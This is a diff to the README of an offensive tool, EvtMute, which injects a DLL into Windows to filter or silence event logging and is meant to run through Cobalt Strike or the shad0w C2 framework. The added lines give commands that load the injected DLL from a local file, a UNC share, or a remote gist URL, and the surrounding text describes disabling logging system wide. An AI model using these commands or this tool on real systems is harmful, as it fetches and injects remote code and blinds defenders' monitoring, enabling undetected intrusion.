@@ -6,6 +6,18 @@ This is a tool that allows you to offensively use [YARA](http://virustotal.githu
 
 Grap the latest verison from [here](https://github.com/bats3c/EvtMute/releases/tag/v1.0). `EvtMuteHook.dll` contains the core functionality, once it is injected it will apply a temporary filter which will allow all events to be reported, this filter can be dynamically updated without having to reinject. I've written `SharpEvtMute.exe` which is a C# assembly that can easily run via `execute` in shad0w or `execute-assembly` in cobalt strike. I will be writing a native version in C for much better intergration with shad0w.
 
+### Loading the DLL
+
+This version removes the embedded DLL (to get around the size restrictions of execute-assembly). The DLL can be loaded from disk, or over the network, using the -d flag eg:
+
+```
+    .\SharpEvtMute.exe -i -d "c:\windows\temp\dll.tmp"
+    .\SharpEvtMute.exe -i -d "\\localhost\c$\windows\temp'dll.tmp"
+    .\SharpEvtMute.exe -i -d "https://gist.github.com/some/gist/raw"
+```
+
+Note that the location must be accessible by the SYSTEM account. Beware proxies and remote UNC paths. 
+
 ### Disabling Logging
 
 A trivial use case would be to disable event logging system wide. To do this we can use the following yara rule.
